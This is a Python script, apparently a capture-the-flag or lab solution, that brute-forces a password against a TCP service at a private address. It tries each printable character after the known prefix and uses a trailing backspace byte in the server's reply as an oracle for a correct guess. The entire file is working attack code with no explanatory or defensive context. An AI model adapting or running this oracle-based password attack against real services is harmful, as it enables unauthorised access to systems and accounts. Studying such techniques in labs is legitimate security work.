#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Sep 12 22:01:24 2021

@author: crr0tz
"""

import socket
from time import sleep

host = '172.18.10.105'
port = 30677
url = (host,port)
b_searching = True
password = ''
while b_searching:
    for i in range(32,126):
        if i != 113:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(200)
            s.connect(url)
            sleep(0.1)
            data = b''
            data += s.recv(200)
                        
            print(f'trying {password}{chr(i)}')
            if password != '':
                for c in password:           
                    s.send(c.encode())
                    sleep(0.2)
                    data += s.recv(200)
            
            s.send(chr(i).encode())
            sleep(0.2)
            data += s.recv(200)
            if b'\x08' in data[-1:]:
                password += chr(i)
                print(f'Found: {password}')
                if len(password)> 100:
                    print(data)
                    b_searching = False
                break
                    
            s.close()

